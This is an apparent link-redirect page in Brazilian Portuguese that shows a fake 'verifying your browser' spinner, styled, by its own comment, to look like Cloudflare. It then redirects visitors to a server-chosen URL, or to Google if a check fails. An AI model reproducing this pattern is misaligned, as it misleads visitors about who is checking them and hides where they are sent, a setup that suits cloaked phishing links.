<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Verificando...</title>
  <style>
    body { font-family: system-ui, -apple-system, sans-serif; background: #f5f5f5; display: grid; place-items: center; min-height: 100vh; margin: 0; padding: 1rem; }
    .card { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 2rem; max-width: 28rem; width: 100%; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,.05); }
    h1 { font-size: 1.125rem; margin: 0 0 1rem; color: #111827; font-weight: 600; }
    .spinner { width: 36px; height: 36px; border: 3px solid #e5e7eb; border-top-color: #2563eb; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 1rem; }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { color: #6b7280; margin: 0; font-size: .875rem; }
  </style>
</head>
<body>
  <div class="card">
    <div class="spinner"></div>
    <h1>Verificando seu navegador...</h1>
    <p id="msg">Aguarde, redirecionando...</p>
  </div>
  <script>
    const FALLBACK_URL = "https://www.google.com";
    function getSlug(){const m=window.location.pathname.match(/^\/s\/(.+)$/);return m?decodeURIComponent(m[1]):"";}
    const msg = document.getElementById("msg");
    (async () => {
      const slug = getSlug();
      if (!slug) { window.location.replace(FALLBACK_URL); return; }
      try {
        // Small delay so user sees "verifying" message (like Cloudflare)
        await new Promise(r => setTimeout(r, 1200));
        const c = await fetch("/.netlify/functions/challenge", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ slug })
        });
        if (!c.ok) { window.location.replace(FALLBACK_URL); return; }
        const { challenge } = await c.json();
        const r = await fetch("/.netlify/functions/verify", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ slug, challenge })
        });
        const data = await r.json();
        if (data.success && data.redirect) {
          window.location.replace(data.redirect);
        } else {
          window.location.replace(data.redirect || FALLBACK_URL);
        }
      } catch {
        window.location.replace(FALLBACK_URL);
      }
    })();
  </script>
</body>
</html>
